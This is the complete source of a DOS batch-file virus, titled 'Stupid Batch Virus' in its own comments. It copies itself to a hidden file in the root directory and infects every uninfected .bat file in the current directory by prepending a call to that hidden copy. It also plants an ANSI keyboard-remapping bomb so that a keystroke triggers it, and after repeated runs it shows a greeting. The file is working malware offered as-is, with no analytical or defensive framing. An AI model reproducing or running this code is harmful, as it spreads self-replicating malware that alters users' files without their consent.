@echo off

rem Stupid Batch Virus - Each time called infects next 
rem uninfected batch file in current directory
rem This file must be in root directory - if not found
rem it copies itself there and hides. Infection is by 
rem a call to the hiding code. An ANSI bomb is also
rem defined to help spread. This is not replication,
rem just infection. After so many times of nothing to
rem do it pops up a greeting message.

if '%1'=='' goto findbatfile
if '%1'=='cls' goto clearandinfect
if '%1'=='showscreen' goto trigger
if '%inf%'=='Yes' goto done
find "C:\$batvir$" < %1 > nul
if errorlevel 1 if not errorlevel 2 goto infect
goto done
:infect
rem not infected yet - add code to beginning of batch file
copy %1 $inftmp$.0 > nul
echo @echo off > $inftmp$.1
echo call C:\$batvir$ >> $inftmp$.1
del %1
copy /b $inftmp$.1 + $inftmp$.0 %1 > nul
del $inftmp$.?
set inf=Yes
goto done
:findbatfile
rem if not in root copy to it
if exist C:\$batvir$.bat goto virexists
copy %0.bat C:\$batvir$.bat > nul
attrib C:\$batvir$.bat +h
:virexists
rem if bomb not resident install it
if '%br%'=='Yes' goto bombresident
echo ["`";"C:\$batvir$ cls";13p
echo [2A
set br=Yes
:bombresident
if %inf%==Done goto trigger
set inf=No 
for %%f in (*.bat) do call C:\$batvir$ %%f
rem trigger if no files left to infect
if %inf%==No set inf=Done
goto done
:clearandinfect
echo [2A[K[1B[K
goto bombresident
:trigger
if '%cnt%'=='' set cnt=0
if %cnt%==10 goto showgreeting
if %cnt%==9 set cnt=10
if %cnt%==8 set cnt=9
if %cnt%==7 set cnt=8
if %cnt%==6 set cnt=7
if %cnt%==5 set cnt=6
if %cnt%==4 set cnt=5
if %cnt%==3 set cnt=4
if %cnt%==2 set cnt=3
if %cnt%==1 set cnt=2
if %cnt%==0 set cnt=1
goto done
:showgreeting
echo [1;37;44m
cls
echo [1;33;41m
echo.
echo [10C                                         
echo [10C    Primitive Stupid Batch Virus         
echo [10C                                         
echo [10C    I must be bored. Writing stupid      
echo [10C    programs like this, just to see      
echo [10C    if it works. OK all you techies      
echo [10C    does this qualify?                   
echo [10C                                         
echo.
pause > nul
echo [0m
cls
set cnt=
:done

